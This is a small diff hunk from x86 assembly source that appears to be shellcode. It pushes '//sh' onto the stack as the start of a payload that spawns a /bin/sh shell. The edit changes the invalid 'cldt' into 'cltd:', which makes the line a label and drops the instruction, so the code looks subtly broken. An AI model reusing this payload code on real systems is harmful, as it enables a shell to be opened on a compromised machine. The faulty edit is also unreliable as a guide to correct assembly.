@@ -10,7 +10,7 @@ section .text
 
 	_start:
 		
-		cldt
+		cltd:
 
 		push edx			
 		push 0x68732f2f			; /bin/sh
